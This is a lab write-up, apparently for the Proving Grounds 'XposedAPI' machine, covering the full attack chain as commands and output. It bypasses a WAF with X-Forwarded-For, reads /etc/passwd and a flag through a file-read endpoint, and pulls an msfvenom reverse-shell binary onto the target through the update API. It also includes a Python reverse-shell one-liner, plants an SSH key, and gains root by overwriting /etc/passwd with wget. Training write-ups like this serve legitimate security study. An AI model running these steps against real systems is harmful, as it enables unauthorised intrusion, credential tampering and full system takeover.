# XposedAPI

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Feb 17 01:51:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/XposedAPI/results/192.168.105.134/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/XposedAPI/results/192.168.105.134/scans/xml/_full_tcp_nmap.xml" 192.168.105.134
Increasing send delay for 192.168.105.134 from 0 to 5 due to 1113 out of 2781 dropped probes since last increase.
Nmap scan report for 192.168.105.134
Host is up, received user-set (0.25s latency).
Scanned at 2022-02-17 01:51:41 EST for 957s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
13337/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 3.4 (91%), Linux 3.5 (91%), Linux 4.2 (91%), Synology DiskStation Manager 5.1 (91%), Linux 3.10 (90%), Linux 2.6.32 or 3.10 (90%), Linux 4.4 (90%), WatchGuard Fireware 11.8 (90%), Linux 3.1 - 3.2 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=42160%PV=Y%DS=2%DC=T%G=Y%TM=620DF43
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%TS=A)SEQ(SP=108%GC
OS:D=1%ISR=109%TI=Z%II=I%TS=A)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT1
OS:1NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 42.927 days (since Wed Jan  5 03:52:07 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   249.91 ms 192.168.49.1
2   250.44 ms 192.168.105.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 02:07:38 2022 -- 1 IP address (1 host up) scanned in 958.44 seconds
```

## 13337 - Web Gunicorn

![](Pasted%20image%2020220217162018.png)

Listed APIS

```

Usage:

/

Methods: GET

Returns this page.

/version

Methods: GET

Returns version of the app running.

/update

Methods: POST

Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs

Methods: GET

Read log files.

/restart

Methods: GET

To request the restart of the app.
```

### API Basic Tests
```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/version
1.0.0b8f887f33975ead915f336f57f0657180                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/logs   
WAF: Access Denied for this Host.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST  http://192.168.105.134:13337/update 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST  http://192.168.105.134:13337/update --data '{"user":"<user requesting the update>", "url":"<url of the update to download>"}'  
Invalid content type.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -H "Content-Type: application/json" http://192.168.105.134:13337/update --data '{"user":"<user requesting the update>", "url":"<url of the update to download>"}'
Invalid username.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/restart                                                                                         
<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -H "Content-Type: application/json" http://192.168.105.134:13337/restart --data '{"confirm":"true"}'
Restart Successful.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


# Exploitation

## API bypass WAF

Use the X-Forwarded-For

```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/logs  -H "X-Forwarded-For:localhost"                                                            
Error! No file specified. Use file=/path/to/log/file to access log files.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/logs  -H "X-Forwarded-For:localhost" --data "file=/etc/passwd"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.105.134:13337/logs  -H "X-Forwarded-For:localhost" -X POST --data "file=/etc/passwd" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -H "X-Forwarded-For:localhost" "http://192.168.105.134:13337/logs?file=/etc/passwd" 
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        <br>
        <br>
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        <br>
        <br>
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

Get local flag first

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -H "X-Forwarded-For:localhost" "http://192.168.105.134:13337/logs?file=/home/clumsyadmin/local.txt" 
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        <br>
        <br>
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        <br>
        <br>
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            f0f83528ff4eccc5a76e5762a66e9947

            </div>
        </div>
    </body>
</html>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -H "X-Forwarded-For:localhost" "http://192.168.105.134:13337/logs?file=/root/proof.txt"             
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Upload Reverse Shell

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -H "Content-Type: application/json" http://192.168.105.134:13337/update --data '{"user":"clumsyadmin", "url":"<url of the update to download>"}'
Update requested by clumsyadmin. Restart the software for changes to take effect.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.105 LPORT=13337 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: shell
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -H "Content-Type: application/json" http://192.168.105.134:13337/update --data '{"user":"clumsyadmin", "url":"192.168.49.105:22/shell"}'        
Update requested by clumsyadmin. Restart the software for changes to take effect.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -X POST -H "Content-Type: application/json" http://192.168.105.134:13337/restart --data '{"confirm":"true"}'
Restart Successful.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 22                                                                              
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 22 (http://0.0.0.0:22/) ...
192.168.105.134 - - [17/Feb/2022 03:21:31] "GET /shell HTTP/1.1" 200 -

```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 13337       
listening on [any] 13337 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.134] 50210
whoami
clumsyadmin
ls /usr/bin | grep python
dh_python2
dh_python3
python
python2
python2.7
python3
python3-config
python3.7
python3.7-config
python3.7m
python3.7m-config
python3m
python3m-config
x86_64-linux-gnu-python3-config
x86_64-linux-gnu-python3.7-config
x86_64-linux-gnu-python3.7m-config
x86_64-linux-gnu-python3m-config
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.105",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'




```


```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 13337
listening on [any] 13337 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.134] 50212
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ cd ..
cd ..
clumsyadmin@xposedapi:/home/clumsyadmin$ cat local.txt
cat local.txt
f0f83528ff4eccc5a76e5762a66e9947
clumsyadmin@xposedapi:/home/clumsyadmin$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.105.134  netmask 255.255.255.0  broadcast 192.168.105.255
        ether 00:50:56:ba:22:f3  txqueuelen 1000  (Ethernet)
        RX packets 655495  bytes 53118655 (50.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 617044  bytes 76860701 (73.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

clumsyadmin@xposedapi:/home/clumsyadmin$ 
```

![](Pasted%20image%2020220217163451.png)

## Upgrade to SSH

```bash
clumsyadmin@xposedapi:/home/clumsyadmin$ mkdir .ssh
mkdir .ssh
clumsyadmin@xposedapi:/home/clumsyadmin$ cd .ssh
cd .ssh
clumsyadmin@xposedapi:/home/clumsyadmin/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > authorized_keys
<9dpSvHGLoEjaNnOsPW7hM= kali@kali" > authorized_keys
clumsyadmin@xposedapi:/home/clumsyadmin/.ssh$ 
```


```bash
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ~/.ssh/id_rsa clumsyadmin@192.168.105.134                                                                                   
The authenticity of host '192.168.105.134 (192.168.105.134)' can't be established.
ECDSA key fingerprint is SHA256:TV71PEPS7AhnnK8K5GqGJm91acGTn5mr9GcVYS7rE1A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.105.134' (ECDSA) to the list of known hosts.
Linux xposedapi 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ 
$ pwd
/home/clumsyadmin
$ bash
clumsyadmin@xposedapi:~$ 
```

# Privesc

## Lmao wget has root privileges

```bash
clumsyadmin@xposedapi:~$ cd /tmp
clumsyadmin@xposedapi:/tmp$ ls
systemd-private-76ee433c7093481ab983541514688040-systemd-timesyncd.service-WnnePy  vmware-root_400-558536622
clumsyadmin@xposedapi:/tmp$ wget 192.168.49.105:8000/lse.sh && chmod +x lse.sh
--2022-02-17 03:37:07--  http://192.168.49.105:8000/lse.sh
Connecting to 192.168.49.105:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                                    100%[=====================================================================================>]  42.55K  83.3KB/s    in 0.5s    

2022-02-17 03:37:08 (83.3 KB/s) - ‘lse.sh’ saved [43570/43570]

chmod: changing permissions of 'lse.sh': Operation not permitted
clumsyadmin@xposedapi:/tmp$ chmod +x lse.sh
chmod: changing permissions of 'lse.sh': Operation not permitted
clumsyadmin@xposedapi:/tmp$ ./lse.sh
bash: ./lse.sh: Permission denied
clumsyadmin@xposedapi:/tmp$ cd ~
clumsyadmin@xposedapi:~$ wget 192.168.49.105:8000/lse.sh && chmod +x lse.sh
--2022-02-17 03:37:25--  http://192.168.49.105:8000/lse.sh
Connecting to 192.168.49.105:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                                    100%[=====================================================================================>]  42.55K  84.6KB/s    in 0.5s    

2022-02-17 03:37:26 (84.6 KB/s) - ‘lse.sh’ saved [43570/43570]

chmod: changing permissions of 'lse.sh': Operation not permitted
clumsyadmin@xposedapi:~$ ls -al
total 92
drwxr-xr-x 5 clumsyadmin clumsyadmin  4096 Feb 17 03:37 .
drwxr-xr-x 3 root        root         4096 Feb  9  2021 ..
-rwxr-xr-x 1         501 staff         210 Oct 28  2020 ._app
-rwxr-xr-x 1 clumsyadmin clumsyadmin   152 Feb 17 03:30 app
lrwxrwxrwx 1 root        root            9 Feb  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 clumsyadmin clumsyadmin   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 clumsyadmin clumsyadmin  3526 Apr 18  2019 .bashrc
drwx------ 3 clumsyadmin clumsyadmin  4096 Feb 15 07:48 .gnupg
-rw-r--r-- 1 clumsyadmin clumsyadmin    33 Feb 17 01:59 local.txt
-rw-r--r-- 1 root        clumsyadmin 43570 Feb 17 03:24 lse.sh
-rw-r--r-- 1 clumsyadmin clumsyadmin   807 Apr 18  2019 .profile
drwxr-xr-x 2 clumsyadmin clumsyadmin  4096 Feb 17 03:34 .ssh
-rwxr-xr-x 1         501 staff         210 Nov 10  2020 ._webapp
drwxr-xr-x 5 clumsyadmin clumsyadmin  4096 Feb  9  2021 webapp
clumsyadmin@xposedapi:~$ 
```

## Adding a new user

https://gtfobins.github.io/gtfobins/wget/
https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/

Get passwd file
```bash
clumsyadmin@xposedapi:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
clumsyadmin@xposedapi:~$
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ nano passwd     
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> passwd
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat passwd                                                       
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8000                                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.105.134 - - [17/Feb/2022 03:32:56] "GET /passwd HTTP/1.1" 200 -

```

```bash
clumsyadmin@xposedapi:~$ wget 192.168.49.105:8000/passwd -O /etc/passwd
--2022-02-17 03:41:46--  http://192.168.49.105:8000/passwd
Connecting to 192.168.49.105:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1446 (1.4K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd                               100%[=====================================================================================>]   1.41K  --.-KB/s    in 0s      

2022-02-17 03:41:47 (6.69 MB/s) - ‘/etc/passwd’ saved [1446/1446]

clumsyadmin@xposedapi:~$ su dummyroot
Password: 
root@xposedapi:/home/clumsyadmin# # password is password
root@xposedapi:/home/clumsyadmin# cd /root
root@xposedapi:~# cat proof.txt
0c29058091860fa8be5940a7c47f8f8c
root@xposedapi:~# ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.105.134  netmask 255.255.255.0  broadcast 192.168.105.255
        ether 00:50:56:ba:22:f3  txqueuelen 1000  (Ethernet)
        RX packets 721243  bytes 58665287 (55.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 677914  bytes 85006475 (81.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@xposedapi:~# 
```

![](Pasted%20image%2020220217164407.png)

# Others